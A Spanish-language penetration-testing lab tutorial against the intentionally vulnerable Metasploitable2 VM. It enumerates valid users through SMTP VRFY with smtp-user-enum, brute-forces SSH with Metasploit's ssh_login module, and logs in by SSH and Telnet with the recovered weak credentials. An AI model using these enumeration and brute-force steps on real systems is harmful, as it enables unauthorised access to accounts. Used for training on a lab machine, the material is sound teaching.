# SMTP con Metasploit

Continuando con el aprendizaje del uso de _Metasploit_, vamos a aprender o recordar conceptos de este tema:

**SMTP**: Significa _Simple Mail Transfer Protocol_ o "Protocolo Simple de Transferencia de Correo," es un protocolo de Internet utilizado para enviar correos electrónicos desde un cliente de correo a un servidor de correo, o de un servidor a otro.

**Dominio local**: Es un par _DIRECCIÓN IP - ALIAS_ que el SOs cuando ejecuta un comando relativo a la red (por ejemplo _ping_ o _nmap_) resuelve ALIAS con la IP especificada antes de ejecutar el comando. En los SOs basados en Linux hay un archivo, _/etc/hosts_, que contiene estos pares, como _127.0.0.1    localhost_.

## Práctica

El host que tenemos en MV _Metasploitable2_ tiene vulnerabilidades de SMTP, así que vamos a averiguarlas:

1. En la carpeta del usuario que esté iniciado la sesión en la terminal de Kali Linux, crear en la carpeta _home_ otra carpeta llamada _ms2_ (ahí pondremos archivos de apoyo de las prácticas con _Metasploitable2_):

```sh
$> cd ~
$> mkdir ms2
```

2. Dentro de esta nueva carpeta crearemos un archivo TXT _users.txt_ con el contenido siguiente (puedes usar cuando editor de texto, pero para mantener el aprendizaje de la terminal te recomendamos _vim_ o _nano_):

```sh
$> cd ms2
$> vim users.txt
(creando el archivo con su contenido)
$> cat users.txt
(para comprobar el contenido del archivo)
```

_users.txt_

```sh
admin
administrator
user
msfadmin
test
password
root
```

Esta lista es un ejemplo básico, pero que se puede ampliar con nombres comunes de usuarios en entornos reales.

> Nota: _vim_ es un editor de texto muy popular y potente, conocido por su eficiencia y configurabilidad. Es una versión mejorada del editor de texto Vi, y se utiliza principalmente en sistemas UNIX/Linux, aunque también está disponible en otros sistemas operativos. Para usarlo en este paso:

  1. Ejecutar _vim users.txt_. Este comando crea el archivo si no existe.
  2. Teclea _i_ para _INSERTAR_ texto en el archivo. Por defecto _vim_ abre el archivo en modo lectura.
  3. Teclea el contenido del archivo.
  4. Para guardar los cambios, teclea _Ecs_ y después _: + w_ (write changes).
  5. Para salir de _vim_, teclea _: + q_.

3. Instala el siguiente paquete:

```sh
$> apt install smtp-user-enum
```

> Nota: Para verificar la instalación, ejecuta _smtp-user-enum help_ y teclear _Tab_ para ver todas las opciones disponibles, o usar _which smtp-user-enum_ para confirmar su ruta de instalación.

4. Ahora vamos a agregar otro dominio local para apuntar siempre a tu host víctima de _Metasploitable2_, _ms2_:

```sh
$> vim /etc/hosts
(editando el archivo agregando la linea "10.0.2.5   ms2")
$> cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
::1             localhost ip6-localhost ip6-loopback
ff02::1         ip6-allnodes
ff02::2         ip6-allrouters
10.0.2.5        ms2
```

5. Verificamos si el nuevo dominio local _ms2_ resuelve para tu host _Metasploitable2_:

```sh
$> ping ms2
PING ms2 (10.0.2.5) 56(84) bytes of data.
64 bytes from ms2 (10.0.2.5): icmp_seq=1 ttl=64 time=14.6 ms
64 bytes from ms2 (10.0.2.5): icmp_seq=2 ttl=64 time=0.932 ms
64 bytes from ms2 (10.0.2.5): icmp_seq=3 ttl=64 time=1.64 ms
64 bytes from ms2 (10.0.2.5): icmp_seq=4 ttl=64 time=1.24 ms
^C
--- ms2 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3090ms
rtt min/avg/max/mdev = 0.932/4.608/14.631/5.792 ms
```

> Nota: **^C** son los caracteres que aparecen cuando tecleamos _Ctrl + C_, que es la combinación de teclas para **interrumpir un comando** en las terminales de los SOs basados en Linux.

6. Ahora, vamos a verificar con los scripts por defecto y la versión del software del SMTP que tiene el host de Metasploitable:

```sh
$> nmap -p 25 -sC -sV ms2
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-11 00:13 EDT
Nmap scan report for ms2 (10.0.2.5)
Host is up (0.0018s latency).

PORT   STATE SERVICE VERSION
25/tcp open  smtp    Postfix smtpd
| sslv2: 
|   SSLv2 supported
|   ciphers: 
|     SSL2_RC4_128_WITH_MD5
|     SSL2_RC4_128_EXPORT40_WITH_MD5
|     SSL2_DES_192_EDE3_CBC_WITH_MD5
|     SSL2_DES_64_CBC_WITH_MD5
|     SSL2_RC2_128_CBC_WITH_MD5
|_    SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
|_smtp-commands: metasploitable.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN
| ssl-cert: Subject: commonName=ubuntu804-base.localdomain/organizationName=OCOSA/stateOrProvinceName=There is no such thing outside US/countryName=XX
| Not valid before: 2010-03-17T14:07:45
|_Not valid after:  2010-04-16T14:07:45
|_ssl-date: 2025-06-11T00:56:58+00:00; -3h16m26s from scanner time.
MAC Address: 08:00:27:DE:69:12 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: Host:  metasploitable.localdomain

Host script results:
|_clock-skew: -3h16m26s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 2.05 seconds
```

Donde:

- **-p 25** es el puerto bien conocido para SMTP.
- **-sC** son los scripts por defecto.
- **-sV** es la bandera para indicar a _nmap_ que investigue la versión del software que ocupa el puerto indicado.
- **ms2** es el dominio local creado recientemente.

La salida indica que el servidor SMTP está mal configurado desde el punto de vista de seguridad exponiendo comandos para usar con SMTP (_smtp-commands_).

7. La parte vulnerable de Metasploitable2 en cuestión de SMTP es el comando **VRFY** que nos arrojó el escaneo hecho con _nmap_. Ahora usamos el paquete _smtp-user-enum_ y el archivo _users.txt_ para verificar si todos los usuarios del archivo están en el servidor y son válidos:

```sh
$> smtp-user-enum -U users.txt -t ms2
Starting smtp-user-enum v1.2 ( http://pentestmonkey.net/tools/smtp-user-enum )

 ----------------------------------------------------------
|                   Scan Information                       |
 ----------------------------------------------------------

Mode ..................... VRFY
Worker Processes ......... 5
Usernames file ........... users.txt
Target count ............. 1
Username count ........... 7
Target TCP port .......... 25
Query timeout ............ 5 secs
Target domain ............ 

######## Scan started at Wed Jun 11 00:39:00 2025 #########
ms2: user exists
ms2: msfadmin exists
ms2: root exists
######## Scan completed at Wed Jun 11 00:39:01 2025 #########
3 results.

7 queries in 1 seconds (7.0 queries / sec)
```

Así, en el host _víctima_ hemos encontrado que en el puerto _abierto_ del _SMTP_ que tiene el comando _VRFY habilitado_ hay 3 usuarios que son válidos en nuestro archivo _users.txt_.

8. Ahora examinamos si el puerto de SSH está abierto en Metasploitable2:

```sh
$> nmap -p 22 -sC -sV ms2
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-11 21:16 EDT
Nmap scan report for ms2 (10.0.2.5)
Host is up (0.0010s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey: 
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
MAC Address: 08:00:27:DE:69:12 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 0.88 seconds
```

_Está abierto_ según reporta _nmap_.

9. Ahora preparamos tanto la db como la consola de _Metasploit_ con un sólo comando:

```sh
$> msfdb run
```

> Nota: _msfdb init_ sólo se utilizará cuando no tengamos preparada en nuestro _Postgres_ la bd de Metasploitable.

10. Ahora búsquemos _ssh login_ para ver las herramienta que tiene _Metasploit_ para apoyarnos a aprovechar ese puerto abierto, y usaremos un módulo de escaneo, mostrando su información y opciones de configuración:

```sh
msf6> search ssh login
Matching Modules
================

   #   Name                                                              Disclosure Date  Rank       Check  Description
   -   ----                                                              ---------------  ----       -----  -----------
   ...
   14  auxiliary/scanner/ssh/ssh_login                                   .                normal     No     SSH Login Check Scanner
   ...
msf6 > use 14
msf6 auxiliary(scanner/ssh/ssh_login) > show info
msf6 auxiliary(scanner/ssh/ssh_login) > show options
```

> Nota: Los _auxiliary_ de Metasploit son herramientas para realizar diversas actividades de prueba de penetración, como escaneo, fuzzing (enviar datos inválidos para detectar vulnerabilidades) o ataques de DoS, sin explotar vulnerabilidades directamente, es decir, _no tienen payload_.

11. Los parámetros que vamos a usar del _auxiliary_ seleccionado son: _RHOSTS, USER_FILE y USER_AS_PASSWORD_, lo configuramos con el archivo _users.txt_ y _true_ (para el último parámetro):

```sh
msf6 auxiliary(scanner/ssh/ssh_login) > set rhosts ms2
rhosts => ms2
msf6 auxiliary(scanner/ssh/ssh_login) > set user_file users.txt
user_file => users.txt
msf6 auxiliary(scanner/ssh/ssh_login) > set user_as_pass true
user_as_pass => true
```

> Nota: Asegúrate de estar en el directorio donde está el archivo _users.txt_ con el comando _pwd_, el prompt de _Metasploit_ no muestra el directorio actual.
> Nota: **USER_AS_PASS** es útil cuando los usuarios tienen contraseñas iguales a su nombre de usuario, una práctica común en entornos mal configurados o de laboratorio.

12. Ejecuta el auxiliary con _run_ o _exploit_:

```sh
msf6 auxiliary(scanner/ssh/ssh_login) > run
[*] 10.0.2.5:22 - Starting bruteforce
[+] 10.0.2.5:22 - Success: 'user:user' 'uid=1001(user) gid=1001(user) groups=1001(user) Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux '
[*] SSH session 1 opened (10.0.2.15:39517 -> 10.0.2.5:22) at 2025-06-11 23:33:22 -0400
[+] 10.0.2.5:22 - Success: 'msfadmin:msfadmin' 'uid=1000(msfadmin) gid=1000(msfadmin) groups=4(adm),20(dialout),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),107(fuse),111(lpadmin),112(admin),119(sambashare),1000(msfadmin) Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux '
[*] SSH session 2 opened (10.0.2.15:35659 -> 10.0.2.5:22) at 2025-06-11 23:33:23 -0400
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

La salida del escaneo nos dice que utilizó un escaneo tipo _bruteforce_ (fuerza bruta), que es probar uno por uno las credenciales dadas por el archivo users.txt para ver si hubo una conexión exitosa o no, es decir, si se abrió un _sesión de shell o terminal_.

13. Para ver qué sesiones se abrieron por SSH con los 2 usuarios indicados en la salida del 
auxiliary, usamos:

```sh
msf6 auxiliary(scanner/ssh/ssh_login) > sessions -l

Active sessions
===============

  Id  Name  Type         Information  Connection
  --  ----  ----         -----------  ----------
  1         shell linux  SSH root @   10.0.2.15:39517 -> 10.0.2.5:22 (10.0.2.5)
  2         shell linux  SSH root @   10.0.2.15:35659 -> 10.0.2.5:22 (10.0.2.5)
```

> Nota: En la columna **Information** dice para ambas sesiones _SSH root @_, más nosotros sabemos que no necesariamente se usó al usuario _root_ para ello, en este caso _msfadmin_ y _user_.

14. Para abrir un shell de la lista anterior, se usa el **Id** de la sesión con la bandera _-i_, ejemplo con el Id = 2, el shell va a iniciar sesión con el usuario _msfadmin_:

```sh
msf6 auxiliary(scanner/ssh/ssh_login) > sessions -i 2
[*] Starting interaction with 2...


id
uid=1000(msfadmin) gid=1000(msfadmin) groups=4(adm),20(dialout),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),107(fuse),111(lpadmin),112(admin),119(sambashare),1000(msfadmin)
whoami
msfadmin
pwd
/home/msfadmin
ls   
vulnerable
```

> Nota: Los shells de _Metasploit_, cuando se conecta al host objetivo, el prompt no tiene nada, simplemente puedes teclear los comandos.

15. Para salir de la sesión ejecutamos el comando _exit_, saliendo del auxiliary y Metasploit y como tenemos sesiones del shell iniciadas por el _auxiliary_ nos pregunta si queremos salir a pesar de, sugiriéndonos el comando si se desea así _exit -y_:

```sh
msf6 auxiliary(scanner/ssh/ssh_login) > exit
[*] You have active sessions open, to exit anyway type "exit -y"
msf6 auxiliary(scanner/ssh/ssh_login) > exit -y
                                                                                                                                  
┌──(root㉿kali)-[~/ms2]
└─#  
```

> Nota: Para salir _gracílmente_ de las sesiones, ejecutas _sessions -k [ID]_ para un Id o _sessions -k_ para terminarlas todas.

16. Ahora, vamos a realizar una conexión SSH manual con los datos extraídos del _ataque_ con el comando de la terminal para hacer conexiones SSH, teniendo sesiones de shell que hemos hecho también con el auxiliary de Metasploit:

```sh
$> ssh -oHostKeyAlgorithms=+ssh-rsa msfadmin@ms2
The authenticity of host 'ms2 (10.0.2.5)' can't be established.
RSA key fingerprint is SHA256:BQHm5EoHX9GCiOLuVscegPXLQOsuPs+E9d/rrJB84rk.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'ms2' (RSA) to the list of known hosts.
msfadmin@ms2's password: 
Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

To access official Ubuntu documentation, please visit:
http://help.ubuntu.com/
No mail.
Last login: Sat Jun  7 22:50:58 2025
msfadmin@metasploitable:~$
```

> Nota: La seguridad de las sesiones de SSH con el software _OpenSSH 4.7p1_ en el host Metasploitable2 ofrecen 2 opciones como lo indicó _nmap_: Algoritmo RSA o DSA/DSS (ssh-hostkey). Antes el software del comando _ssh_ hacía la conexión por defecto sin que tú te tuvieras que especificar el algoritmo (_ssh msfadmin@ms2_), pero esto se detectó como fallo con el paso del tiempo desde la versión 9.8, y ya no detecta como seguras las conexiones basadas en DSA que tuvieran como objetivo establecer conexión con OpenSSH 4.7p1  (y ni siquiera la RSA pero son más seguras que DSA), así que si queremos establecer la conexión tenemos que decirle al comando _ssh_ que _use RSA_ con la opción **_-oHostKeyAlgorithms=+ssh-rsa_**. Si usas +ssh_dss en la opción como en muchos post de internet dicen, te aparecerá _"command-line line 0: Bad key types '+ssh-dss'"_ y se abortará el intento de la conexión. Actualmente los equipos, versiones y configuraciones de los softwares SSH al menos utilizan RSA sin necesidad de especificarlo con la opción, pero es bueno saber la existencia de esta bandera.

17. Ahora probemos haciendo lo mismo pero con el usuario _user_:

```sh
$> ssh -oHostKeyAlgorithms=+ssh-rsa user@ms2
user@ms2's password: 
Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

To access official Ubuntu documentation, please visit:
http://help.ubuntu.com/
user@metasploitable:~$ 
```

18. Como vemos, los usuarios que obtuvimos por el protocolo SMTP pueden ser usados en SSH, pero ¿y si también pudiesen ser utilizados para conectarse por Telnet? Telnet es otro protocolo para establecer sesiones de shell. Vamos a escanear el host de Metasploitable2 para ello:

```sh
$> nmap -p 23 -sC -sV
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-12 13:39 EDT
Nmap scan report for ms2 (10.0.2.5)
Host is up (0.0011s latency).

PORT   STATE SERVICE VERSION
23/tcp open  telnet  Linux telnetd
MAC Address: 08:00:27:DE:69:12 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.77 seconds
```

> Nota: Telnet transmite credenciales en texto plano, lo que lo hace extremadamente inseguro en redes reales. Esto contrasta con SSH, que cifra la sesión.

19. Ahora vamos a establecer una conexión de Telnet con el comando _telnet_ y el dominio local de Metasploitable2, aparecerá tal cual una pantalla muy similar a la de la MV cuando se inicia, tratar de iniciar sesión con las credenciales de _user_:

```sh
$> telnet ms2
Trying 10.0.2.5...
Connected to ms2.
Escape character is '^]'.
                _                  _       _ _        _     _      ____  
 _ __ ___   ___| |_ __ _ ___ _ __ | | ___ (_) |_ __ _| |__ | | ___|___ \ 
| '_ ` _ \ / _ \ __/ _` / __| '_ \| |/ _ \| | __/ _` | '_ \| |/ _ \ __) |
| | | | | |  __/ || (_| \__ \ |_) | | (_) | | || (_| | |_) | |  __// __/ 
|_| |_| |_|\___|\__\__,_|___/ .__/|_|\___/|_|\__\__,_|_.__/|_|\___|_____|
                            |_|                                          


Warning: Never expose this VM to an untrusted network!

Contact: msfdev[at]metasploit.com

Login with msfadmin/msfadmin to get started


metasploitable login: user
Password: 
Last login: Thu Jun 12 13:34:55 EDT 2025 from 10.0.2.15 on pts/1
Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

To access official Ubuntu documentation, please visit:
http://help.ubuntu.com/
user@metasploitable:~$ 
```

¡Funcionó! Por lo tanto hemos descubierto otra vulnerabilidad a lo largo de esta práctica: _Tener a los mismos usuarios y credenciales para varios servicios es **FATAL**_.
